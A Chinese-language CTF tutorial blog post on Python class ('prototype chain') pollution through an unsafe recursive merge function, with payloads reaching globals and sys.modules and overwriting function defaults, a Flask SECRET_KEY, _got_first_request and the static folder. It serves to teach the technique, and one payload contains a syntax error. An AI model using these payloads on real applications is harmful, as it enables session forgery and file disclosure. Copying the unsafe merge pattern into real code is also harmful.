---
title: Python原型链污染
author: Creexile
date: 2024-07-05
lastMod: 2025-07-26
summary: ''
cover: ''
category: 'CTF'
draft: false
comments: false
sticky: 0
tags: [原型链污染, CTF]
---

# 是什么

Python中的原型链污染(Prototype Pollution)是指通过修改对象原型链中的属性，对程序的行为产生意外影响或利用漏洞进行攻击的一种技术

在 Python中, 对象的属性和方法可以通过原型链继承来获取. 每个对象都有一个原型, 原型上定义了对象可以访问的属性和方法. 当对象访问属性或方法时, 会先在自身查找, 如果找不到就会去原型链上的上级对象中查找, 原型链污染攻击的思路是通过修改对象原型链中的属性, 使得程序在访问属性或方法时得到不符合预期的结果. 常见的原型链污染攻击包括修改内置对象的原型、修改全局对象的原型等

> 原理和Nodejs原型链污染的根本原理一样, Nodejs是对键值对的控制来进行污染, 而Python则是对类属性值的污染, 且只能对类的属性来进行污染不能够污染类的方法

# 条件

原型链污染需要merge合并函数，通过递归合并来修改父级属性，CTF中常见的merge函数如下

```python
def merge(src, dst):  # src为原字典，dst为目标字典
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):  # 键值对字典形式
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))  # 递归到字典最后一层
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:  # class形式
            merge(v, getattr(dst, k))  # 递归到最终的父类
        else:
            setattr(dst, k, v)
```

我们可以通过对src的控制，来控制dst的值，来达到我们污染的目的

注意Object类型不能被污染, 会直接报错

# 例子

```python
class father:
    secret = "hello"
class son_a(father):
    pass
class son_b(father):
    pass
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
instance = son_b()
payload = {
    "__class__" : {
        "__base__" : {
            "secret" : "world"
        }
    }
}
print(father.secret)  # hello
print(son_a.secret)  # hello
print(instance.secret)  # hello
merge(payload, instance)
print(son_a.secret)  # world
print(instance.secret)  # world
print(father.secret)  # world
```

setattr函数如下

```python
def setattr(x, y, v): # real signature unknown; restored from __doc__
    """
    Sets the named attribute on the given object to the specified value.
    setattr(x, 'y', v) is equivalent to ``x.y = v''
    """
    pass
```

自动获取k和v之后(这里是secret和world), 完成`dst.k=v`的污染. 通过对子类的"修改"来改变父类的属性, 这样所有的继承都会变为这个变量

# 获取目标类

## 获取父类

例子中通过`__base__`属性查找到继承的父类

```python
class father:
    secret = "hello"
class son_a(father):
    pass
class son_b(father):
    pass

print(father.secret)  # hello
print(son_a.__class__)  # <class 'type'>
print(son_a.__base__)  # <class '__main__.father'>
```

## 获取全局变量

`__init__`初始化方法作为类的一个内置方法, 在没有被重写作为函数的时候, 其数据类型会被当做装饰器, 特点就是都具有一个全局属性`__globals__`属性.

`__globals__` 属性返回一个字典, 里面包含了函数定义时所在模块的全局变量

所以可以通过加上`globals`来获得和修改对应的全局变量

```python
a = 1
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class A:
    def __init__(self):
        pass
class B:
    class1 = 2

instance = A()
payload = {
    "__init__":{
        "__globals__":{
            "a":4,
            "B":{
                "class1":5
            }
        }
    }
}

print(B.class1)
print(a)
merge(payload, instance)
print(B.class1)
print(a)
# 2 1
# 5 4
```

## 获取其他模块

### import加载

你就把获取全局变量的变成另一个文件然后引入就好了

```python
payload = {
    "__init__":{
        "__globals__":{
            "demo":{
                "a":4,
                "B":{
                    "class1:5
                }
            }
        }
    }
}
```

### sys模块加载

借助sys模块中的`__module__`属性, 这个属性能够加载出来在自运行开始所有已加载的模块, 从而我们能够从属性中获取到我们想要污染的目标模块

```python
import sys
payload = {
    "__init__":{
        "__globals__":{
            "sys":{
                "modules":{
                    "demo":{
                        "a":4,
                        "B":{
                            "class1":5
                        }
                    }
                }
            }
        }
    }
}
```

### 加载器loader获取sys

loader加载器在python中的作用是为实现模块加载而设计的类, 其在`importlib`这一内置模块中有具体实现. 而`importlib`模块下所有的`py`文件中均引入了`sys`模块, 所以只需要获取loader就可以获取sys模块

获取方式如下: `loader.__init__.__globals__['sys']`

```python
import math
print(math.__loader__)
```

### spec获取sys

在python中还存在一个`__spec__`，包含了关于类加载时候的信息，它定义在`Lib/importlib/_bootstrap.py`的类`ModuleSpec`中

获取方式: `<模块名>.__spec__.__init__.__globals__['sys']`

# 利用方式

主要是替换关键内容, 比如密钥/验证密码等

## 函数形参默认值替换

`__defaults__`是python中的一个**元组**, 用于存储函数或方法的默认参数值. 我们通过替换该属性, 来实现对函数位置或者是键值默认值替换

`__kwdefaults__`是以**字典**形式来进行收录, 同样可以被替换

```python
# defaults
payload_d = {
    "__init__" : {
        "__globals__" : {
            "demo" : {
                "__defaults__" : (True,)
            }
        }
    }
}
# kwdefaults
payload_kwd = {
    "__init__" : {
        "__globals__" : {
            "demo" : {
                "__kwdefaults__" : {
                    "shell" : True
                }
            }
        }
    }
}
```

## 关键信息替换

### flask密钥替换

在不知道密钥(secret_key)的条件下进行session伪造需要能替换的手段, 这个就不错

如何替换还要看这个secret_key在哪里, 总之获取全局变量后, 可以通过`app.config["SECRET_KEY"]`进行污染

```python
payload = {
    "__init__" : {
        "__globals__" : {
            "app" : {
                "config" : {
                    "SECRET_KEY" :"apple"
                }
            }
        }
    }
}
```

### \_got_first_request

该值用于判定是否某次请求为自`Flask`启动后第一次请求, `_got_first_request`值为假时才会调用装饰器

所以如果我们想调用第一次访问前的请求，还想要在后续请求中进行使用的话，我们就需要将`_got_first_request`改成false然后就能够在后续访问的过程中，仍然能够调用装饰器

```python
payload={
    "__init__":{
        "__globals__":{
            "app":{
                "_got_first_request":False
            }
        }
    }
}
```

### \_static_url_path:

当python指定了static静态目录以后，我们再进行访问就会定向到static文件夹下面的对应文件而不会存在目录穿梭的漏洞，但是如果我们想要访问其他文件下面的敏感信息，我们就需要污染这个静态目录，让他自动帮我们实现定向

```python
payload={
    "__init__":{
        "__globals__":{
            "app":{
                "_static_folder":"./"
            }
        }
    }
}
```

# 其他

```python
print(son_a.__base__)
# 获取父类: <class '__main__.father'>
print(dir(son_a.__base__))
# 获取父类的所有变量, 包括带下划线的
print(getattr(son_a.__base__, 'secret'))
# 根据变量名（字符串 attr）动态获取父类中对应变量的值
```

```python
# 获取父类所有变量
father_attributes = [attr for attr in dir(son_a.__base__) if not attr.startswith('__')]

# 仅打印无下划线的部分
print(father_attributes)  # ['secret', 'name']

# 使用 getattr 获取变量的值
for attr in father_attributes:
    value = getattr(son_a.__base__, attr)
    print(f"{attr}: {value}")
```

[浅谈Python原型链污染及利用方式](https://xz.aliyun.com/news/12518)

[从CISCN2024的sanic引发对python“原型链”的污染挖掘](https://xz.aliyun.com/news/14057)
